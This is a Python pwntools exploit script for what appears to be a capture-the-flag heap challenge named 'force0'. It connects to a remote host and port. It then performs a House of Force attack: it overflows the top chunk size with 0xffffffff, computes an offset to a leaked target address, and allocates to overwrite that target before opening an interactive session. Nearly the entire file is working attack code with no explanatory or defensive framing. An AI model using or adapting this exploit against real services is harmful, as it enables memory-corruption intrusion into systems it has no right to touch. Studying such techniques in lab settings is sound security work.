#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

remote_service = "107.191.51.129 5002"
remote_service = remote_service.strip().split(" ")
p = remote(remote_service[0], int(remote_service[1]))
filename = "./force0"
# p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))

def malloc(size, data):
	ru(b"3) quit\n> \n")
	sl(b"1")
	ru(b"Size: \n")
	sl(str(size).encode())
	ru(b"Data: \n")
	sn(data)
def target():
	ru(b"3) quit\n> \n")
	sl(b"2")

def dbg0():
	lg(b"heap_addr")
	lg(b"target_addr")
	lg(b"p.pid")
	input()
	

ru(b"Heap address @")
heap_addr = int(ru(b"\nTarget address @", "drop"), 16)
target_addr = int(ru(b"\n", "drop"), 16)

# top_chunk = heap_addr+0x20

malloc(0x18, b"a"*0x18 + p32(0xffffffff)*2)
top_chunk = heap_addr+0x20
offset = target_addr - top_chunk - 0x20
lg(b"offset")
malloc(offset, b"I DID!\x00")
malloc(0x10, b"I DID!\x00")

irt()